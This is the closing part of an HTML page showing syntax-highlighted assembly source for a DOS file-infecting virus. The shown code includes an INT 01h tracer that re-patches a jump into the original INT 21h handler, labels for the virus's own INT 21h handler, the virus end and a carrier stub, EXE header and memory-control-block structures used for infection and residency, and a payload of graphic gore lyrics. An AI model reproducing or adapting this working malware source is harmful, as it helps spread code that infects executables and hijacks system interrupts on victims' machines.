                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">INT_Entry_Bytes</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">; Five bytes to swap.</span><span class="sc0">

                </span><span class="sc6">CLD</span><span class="sc0">

                </span><span class="sc6">CLI</span><span class="sc0">

</span><span class="sc5">Swap_Byte</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">STOSB</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Swap_Byte</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Tracer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">

                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">          </span><span class="sc1">; Grab CS:IP from the stack.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9Dh</span><span class="sc0">   </span><span class="sc1">; Next instruction is POPF ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Check_Segment</span><span class="sc0">

                </span><span class="sc1">; Set TF in the pushed flags on the stack.</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">

</span><span class="sc5">Check_Segment</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                  </span><span class="sc1">; Don't do any checks while</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exit_Tracer</span><span class="sc0">             </span><span class="sc1">; we're still in our own CS.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; Calculate the linear CS</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; address.</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                  </span><span class="sc1">; And add IP afterwards.</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; DI:SI = linear address of</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; next instruction.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Orig_Int21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Calculate linear CS address</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; of the original INT 21h.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Orig_Int21h</span><span class="sc0">         </span><span class="sc1">; DX:AX = linear address of</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                  </span><span class="sc1">; the original INT 21h.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; Check if we're below the</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Re_Swap_JMP</span><span class="sc0">             </span><span class="sc1">; patch-bytes. If so, shove</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Check_If_Over</span><span class="sc0">           </span><span class="sc1">; the JMP back in.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Re_Swap_JMP</span><span class="sc0">

</span><span class="sc5">Check_If_Over</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; Check if we're above the</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Re_Swap_JMP</span><span class="sc0">             </span><span class="sc1">; patch-bytes.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_Tracer</span><span class="sc0">

</span><span class="sc5">Re_Swap_JMP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2501h</span><span class="sc0">               </span><span class="sc1">; Restore original INT 01h.</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">Orig_Int_01h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Old_Int21h</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Swap_JMP</span><span class="sc0">                </span><span class="sc1">; Put JMP back in.</span><span class="sc0">

                </span><span class="sc1">; Disable TF in the stack.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">

</span><span class="sc5">Exit_Tracer</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">IRET</span><span class="sc0">


</span><span class="sc5">Message</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Your pulverised torso languishes in it''s pool of pus'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Minced, cancerous viscera - gore seeps from the guts'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'My fetid fetish is to excavate the moulding rot'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'I drool my gastric juices as I chomp on your blood-clots'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Fermenting innards, bubbling with rot'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Alcoholic pus, dissolves the wooden box'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'I gouge into the chest''s cavity to rip out the intestines'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Slivering soft entrails to release the foaming secretions'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'I suck up the concoction and eat the decay'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'With cankered disgorgement I excrete my gurgling prey'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Bile, chyme and blood in the offal effervesce'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'I eviscerate the bowels and drink the clotted cess'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">


</span><span class="sc5">INT_Entry_Bytes</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Virus_Int21h</span><span class="sc0">
</span><span class="sc5">Virus_End</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Orig_Int_01h</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Virus_End_Mem</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">Carrier</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">EXE_ID</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Image_Mod_512</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_512_Pages</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Items</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Header_Size_PG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Min_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Max_Size_Mem</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_SP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Checksum</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_IP</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Program_CS</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Reloc_Table</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXE_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">Find_FN_Win32</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">Win32_Attr</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win32_Created</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win32_Access</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win32_Time</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win32_Date</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win32_Size_High</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win32_Size_Low</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Win32_Reserved</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Win32_Win_Name</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Win32_DOS_Name</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Find_FN_Win32</span><span class="sc0">   </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">MCB_Header</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">MCB_ID</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MCB_PSP</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MCB_Para_Size</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MCB_Dunno</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">MCB_Program</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">MCB_Header</span><span class="sc0">      </span><span class="sc9">ENDS</span><span class="sc0">

                </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">START</span><span class="sc0">
</span></div></body>
</html>
